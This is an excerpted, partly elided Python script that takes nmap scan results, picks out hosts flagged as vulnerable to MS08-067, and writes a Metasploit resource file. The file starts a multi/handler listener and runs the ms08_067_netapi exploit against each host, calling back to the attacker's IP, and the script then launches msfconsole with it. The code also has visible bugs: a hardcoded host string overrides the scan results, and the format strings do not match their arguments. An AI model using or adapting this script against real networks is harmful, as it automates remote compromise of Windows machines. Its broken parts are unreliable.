...
#def start_msf():
#    msf_cmd = 'msfconsole'
#    msf_proc = run_proc_xterm(msf_cmd)
...
def get_ms08067_hosts(hosts):
    ...
    for host in hosts:
        ...
        for script_out in host.scripts_results:
            if script_out['id'] == 'smb-vuln-ms08-067':
...
def create_rc_file(ms08067_hosts):
    ...
    start_handler_lines =  ('use exploit/multi/handler\n'
                            ...
                            'exploit -j -z\n'
                            'set AutoRunScript multi_console_command -rc autorun.rc'.format(local_ip))
    ...
    ms08067_lines = ('use exploit/windows/smb/ms08_067_netapi\n'
                     ...
                     'set LHOST {}\n'
                     'set PORT {}\n'
                     'exploit -j -z\n')#.format(vuln_host, local_ip, port)

    with open('ms08067.rc', 'w') as f:
        f.write(start_handler_lines)
        for ip in ms08067_hosts:
            f.write(ms08067_lines.format(ip, local_ip, port))

def main(report, args):
    report = parse_nmap(args)
    hosts = get_hosts(args, report)
    ms08067_hosts = get_ms08067_hosts(hosts)
    ms08067_hosts = ['192.168.1.1,192.168.3.3']
    # RC file is named ms08067.rc
    create_rc_file(ms08067_hosts)
    proc = run_proc_xterm('msfconsole -r ms08067.rc')
